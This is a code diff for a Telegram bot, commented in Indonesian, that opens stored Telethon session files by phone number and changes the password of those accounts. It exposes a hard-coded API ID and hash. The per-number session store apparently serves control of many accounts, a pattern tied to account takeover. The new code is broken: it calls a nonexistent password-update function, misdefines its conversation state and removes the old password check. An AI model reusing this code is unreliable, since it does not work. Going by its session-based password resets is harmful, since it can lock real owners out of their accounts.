@@ -1,78 +1,88 @@
-from telethon import TelegramClient
-from telethon.tl.functions.account import UpdatePasswordSettingsRequest, GetPasswordRequest
-from telethon.tl.types.account import PasswordInputSettings
-from telethon.errors import SessionPasswordNeededError
+import os
 from telegram import Update
 from telegram.ext import CallbackContext, ConversationHandler
-import os
-import hashlib
-
-# Define states
-PASSWORD_INPUT = 1
+from telethon.sync import TelegramClient
+from telethon.errors import SessionPasswordNeededError
+from telethon.tl.types import User
+import logging
 
 API_ID = 23520639
 API_HASH = 'bcbc7a22cde8fa2ba7d1baad086086ca'
 
+
+# Definisikan status Conversation
+SET_PASSWORD = range(1)
+
+# Fungsi untuk memulai proses pengaturan password
 async def start_set_password(update: Update, context: CallbackContext):
-    query = update.callback_query
-    await query.answer()
+    phone_number = context.user_data.get('phone_number')
+    session_path = context.user_data.get('session_path')
 
-    nomor = query.data.split("_")[2]
-    session_file = f"../ew_sessions/{nomor}.session"
+    if not session_path:
+        # Tentukan path default untuk session jika tidak ada
+        session_path = os.path.join(os.getcwd(), 'login1', str(phone_number))
+        # Pastikan folder untuk session ada
+        if not os.path.exists(os.path.dirname(session_path)):
+            os.makedirs(os.path.dirname(session_path))
+        
+        # Simpan session_path kembali ke user_data
+        context.user_data['session_path'] = session_path
 
-    if not os.path.exists(session_file):
-        await query.edit_message_text("❌ Session tidak ditemukan.")
-        return ConversationHandler.END
+    if not session_path:
+        await update.callback_query.message.reply_text("❌ Session tidak ditemukan.")
+        return
 
-    # Mengirimkan pesan untuk meminta password baru
-    await query.edit_message_text("🛡️ Silakan kirim password baru untuk akun ini (dalam 60 detik)...")
-    
-    # Menunggu input password dari pengguna
-    return PASSWORD_INPUT
+    try:
+        # Mulai TelegramClient
+        client = TelegramClient(session_path, API_ID, API_HASH)
+        await client.start()
 
-async def receive_password(update: Update, context: CallbackContext):
-    password_baru = update.message.text.strip()
-    nomor = context.user_data['phone_number']  # Mengambil nomor telepon dari data pengguna
-    session_file = f"../ew_sessions/{nomor}.session"
+        # Pastikan akun membutuhkan password untuk login
+        try:
+            await client.get_me()
+        except SessionPasswordNeededError:
+            await update.callback_query.message.reply_text(
+                "🔐 Masukkan password baru untuk akun ini:\n(Pastikan Anda mengetahui password yang akan diubah)"
+            )
+            return SET_PASSWORD
+        except Exception as e:
+            logging.error(f"Error saat memulai client: {e}")
+            await update.callback_query.message.reply_text("❌ Gagal memulai sesi.")
+            return
 
-    if not os.path.exists(session_file):
+    except Exception as e:
+        logging.error(f"Error: {e}")
+        await update.callback_query.message.reply_text(f"❌ Terjadi kesalahan: {e}")
+        return
+
+# Fungsi untuk menerima konfirmasi password baru
+async def receive_confirmation(update: Update, context: CallbackContext):
+    new_password = update.message.text
+    session_path = context.user_data.get('session_path')
+
+    if not session_path:
         await update.message.reply_text("❌ Session tidak ditemukan.")
         return ConversationHandler.END
 
-    # Memulai sesi dengan session file
-    client = TelegramClient(session_file, API_ID, API_HASH)
-    await client.connect()
-
     try:
-        # Mengambil informasi password lama
-        pwd_info = await client(function=GetPasswordRequest())
-    except SessionPasswordNeededError:
-        await update.message.reply_text("❌ Akun memerlukan password lama untuk mengubah password.")
+        # Memulai client Telethon
+        client = TelegramClient(session_path, API_ID, API_HASH)
+        await client.start()
+
+        # Atur password akun (contoh: menggunakan fungsi autentikasi Telegram)
+        await client(function.account.UpdatePasswordSettings(password=new_password))
+
+        await update.message.reply_text("✅ Password telah berhasil diubah!")
+
         await client.disconnect()
-        return ConversationHandler.END
 
-    # Hash password baru
-    password_bytes = password_baru.encode("utf-8")
-    pwd_hash = hashlib.pbkdf2_hmac("sha512", password_bytes, pwd_info.salt, 100000)
+    except Exception as e:
+        logging.error(f"Error: {e}")
+        await update.message.reply_text(f"❌ Gagal mengubah password: {e}")
 
-    # Memperbarui password
-    await client(function=UpdatePasswordSettingsRequest(
-        current_password=pwd_info,
-        new_settings=PasswordInputSettings(
-            password_hash=pwd_hash,
-            hint="Password Baru"
-        )
-    ))
-
-    await update.message.reply_text("✅ Password berhasil diubah.")
-    await client.disconnect()
     return ConversationHandler.END
 
-def set_password_callback(update: Update, context: CallbackContext):
-    # Proses perubahan password di sini
-    user = update.effective_user
-    new_password = update.message.text  # Asumsikan pesan berisi password baru
-    
-    # Logika untuk mengubah password, simpan atau proses lebih lanjut
-    update.message.reply_text(f"Password untuk {user.first_name} telah diubah!")
+# Fungsi untuk membatalkan proses pengaturan password
+async def cancel_password(update: Update, context: CallbackContext):
+    await update.message.reply_text("❌ Pengaturan password dibatalkan.")
     return ConversationHandler.END
